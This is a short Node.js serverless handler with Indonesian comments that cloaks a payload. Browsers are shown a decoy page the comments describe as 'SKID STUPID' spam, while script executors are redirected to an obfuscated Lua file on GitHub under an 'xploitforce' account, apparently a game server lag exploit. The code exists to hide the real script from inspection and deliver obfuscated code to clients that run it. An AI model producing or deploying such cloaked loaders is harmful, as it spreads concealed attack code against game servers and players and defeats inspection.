const fs = require('fs');
const path = require('path');

export default function handler(req, res) {
    const userAgent = req.headers['user-agent'] || '';

    // Cek apakah yang akses adalah Browser
    if (userAgent.includes('Mozilla') || userAgent.includes('Chrome') || userAgent.includes('Safari')) {
        // Baca file index.html yang isinya spam "SKID STUPID"
        const filePath = path.join(process.cwd(), 'index.html');
        const fileContent = fs.readFileSync(filePath, 'utf8');
        
        res.setHeader('Content-Type', 'text/html');
        return res.status(200).send(fileContent);
    } 

    // Jika lewat Eksekutor, langsung arahkan ke Script Asli
    res.redirect('https://raw.githubusercontent.com/xploitforceofficial-stack/lagserveragora2/refs/heads/main/obfuscated_script-1770458410194.lua');
}
